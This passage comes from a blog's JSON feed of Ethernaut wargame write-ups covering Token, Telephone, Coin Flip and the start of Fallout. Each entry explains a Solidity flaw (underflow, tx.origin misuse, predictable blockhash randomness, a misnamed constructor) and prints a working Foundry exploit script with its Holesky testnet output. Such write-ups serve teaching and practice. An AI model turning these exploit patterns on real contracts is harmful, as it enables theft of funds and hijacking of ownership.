class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-</span> <span class=\"n\">_value</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"nb\">balance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_owner</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Overflow can occur in Solidity versions under 0.8.0.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Token.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">TokenSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Token</span> <span class=\"k\">public</span> <span class=\"n\">token_</span> <span class=\"o\">=</span> <span class=\"n\">Token</span><span class=\"p\">(</span><span class=\"mh\">0xc5176701831Dcf084be5f95617605D2107d97182</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"mi\">21</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TokenSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†í] Compiling 1 files with Solc 0.6.12<span class=\"o\">[</span>‚†ë] Solc 0.6.12 finished <span class=\"k\">in </span>497.00msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used <span class=\"k\">for </span>script: 67542Estimated amount required: 0.000000067542472794 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH <span class=\"o\">(</span>48900 gas <span class=\"k\">*</span> 0.001 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/balanceofplayer.png\" alt=\"Image balanceofplayer\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/token",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/telephone",
            "title": "Telephone",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone {    address public owner;    constructor() {        owner = msg.sender;    }    function changeOwner(address _owner) public {        if (tx.origin != msg.sender) {            owner = _owner;        }    }}When initially creating a contract, the owner is set to msg.sender. However, in the changeOwner() function, if tx.origin and msg.sender are different, the value received as an argument is set as the owner.tx.origin is the address that first initiated the contract call (it‚Äôs always an EOA account),msg.sender is the address that last called the contract.If I call contract A, and contract A calls contract B, a difference will arise between tx.origin and msg.sender within contract B.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Telephone.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(Telephone telephone_, address _address) {        telephone_.changeOwner(_address);    }}contract TelephoneSol is Script {    Telephone public telephone_ = Telephone(0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"owner: \", telephone_.owner());        new Ex(telephone_, vm.envAddress(\"MY_ADDRESS\"));        console.log(\"owner: \", telephone_.owner());        vm.stopBroadcast();    }}$ forge script script/TelephoneSol.sol --broadcast --tc TelephoneSol[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 283.34msCompiler run successful!Script ran successfully.== Logs ==  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used for script: 107575Estimated amount required: 0.00000020586821385 ETH==========================‚†Å Sequence #1 on holesky | Waiting for pending transactions    ‚†† [Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ‚†≤ [00:00:08] [#####################################################################] 1/1 txes (0.0s)##### holesky‚úÖ  [Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH (82750 gas * 0.001913708 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Telephone</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span> <span class=\"o\">!=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When initially creating a contract, the <code class=\"language-plaintext highlighter-rouge\">owner</code> is set to <code class=\"language-plaintext highlighter-rouge\">msg.sender</code>. However, in the <code class=\"language-plaintext highlighter-rouge\">changeOwner()</code> function, if <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> are different, <strong>the value received as an argument</strong> is set as the <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">tx.origin</code> is the address that first initiated the contract call (it‚Äôs always an EOA account),</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> is the address that last called the contract.</p><p>If I call contract A, and contract A calls contract B, a difference will arise between <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> within contract B.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Telephone.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">Telephone</span> <span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"n\">_address</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">TelephoneSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Telephone</span> <span class=\"k\">public</span> <span class=\"n\">telephone_</span> <span class=\"o\">=</span> <span class=\"n\">Telephone</span><span class=\"p\">(</span><span class=\"mh\">0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TelephoneSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> TelephoneSol<span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>283.34msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used <span class=\"k\">for </span>script: 107575Estimated amount required: 0.00000020586821385 ETH<span class=\"o\">==========================</span>‚†Å Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚†† <span class=\"o\">[</span>Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ‚†≤ <span class=\"o\">[</span>00:00:08] <span class=\"o\">[</span><span class=\"c\">#####################################################################] 1/1 txes (0.0s)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH <span class=\"o\">(</span>82750 gas <span class=\"k\">*</span> 0.001913708 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/owner().png\" alt=\"Image owner\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/telephone",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/coin-flip",
            "title": "Coin Flip",
            "summary": null,
            "content_text": "AnalysisThe goal is  guess the correct outcome 10 times in a row.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip {    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() {        consecutiveWins = 0;    }    function flip(bool _guess) public returns (bool) {        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) {            revert();        }        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) {            consecutiveWins++;            return true;        } else {            consecutiveWins = 0;            return false;        }    }}Using to blackhashvalue to generate random numbers.Since this is accessible not only to the contract but also to external users, it becomes predictable.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/CoinFlip.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(CoinFlip coinflip_) {        uint256 blockValue = uint256(blockhash(block.number - 1));        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        coinflip_.flip(side);    }}contract CoinFlipSol is Script {    CoinFlip public coinflip_ = CoinFlip(0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex(coinflip_);        console.log(\"Win counts: \", coinflip_.consecutiveWins());                vm.stopBroadcast();    }}$ forge script script/CoinFlipSol.sol --tc CoinFlipSol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Win counts:  10## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used for script: 123189Estimated amount required: 0.000000269426908278 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH (94761 gas * 0.002187094 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>guess the correct outcome 10 times in a row.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlip</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">consecutiveWins</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">lastHash</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">consecutiveWins</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">lastHash</span> <span class=\"o\">==</span> <span class=\"n\">blockValue</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span><span class=\"p\">();</span>        <span class=\"p\">}</span>        <span class=\"n\">lastHash</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span><span class=\"p\">;</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">side</span> <span class=\"o\">==</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span><span class=\"o\">++</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Using to <code class=\"language-plaintext highlighter-rouge\">blackhash</code>value to generate random numbers.</p><p>Since this is accessible not only to the contract but also to external users, it becomes predictable.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/CoinFlip.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">constant</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">CoinFlip</span> <span class=\"n\">coinflip_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"n\">side</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlipSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">CoinFlip</span> <span class=\"k\">public</span> <span class=\"n\">coinflip_</span> <span class=\"o\">=</span> <span class=\"n\">CoinFlip</span><span class=\"p\">(</span><span class=\"mh\">0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">coinflip_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Win counts: \"</span><span class=\"p\">,</span> <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">consecutiveWins</span><span class=\"p\">());</span>                <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/CoinFlipSol.sol <span class=\"nt\">--tc</span> CoinFlipSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Win counts:  10<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used <span class=\"k\">for </span>script: 123189Estimated amount required: 0.000000269426908278 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH <span class=\"o\">(</span>94761 gas <span class=\"k\">*</span> 0.002187094 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/win.png\" alt=\"Image win\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/coin-flip",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallout",
            "title": "Fallout",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership of the contract below// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Fallout {    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable {        owner = msg.sender;        allocations[owner] = msg.value;    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function allocate() public payable {        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    }    function sendAllocation(address payable allocator) public {        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    }    function collectAllocations() public onlyOwner {        msg.sender.transfer(address(this).balance);    }    function allocatorBalance(address allocator) public view returns (uint256) {        return allocations[allocator];    }}Solidity 0.6.0 Documentation - constructorsüí°Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.For some reason, the intended constructor code was written as Fal1out(), preventing it from acting as a constructor and allowing external access, which enables claiming owner.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Fallout.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallout public fallout_ = Fallout(0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        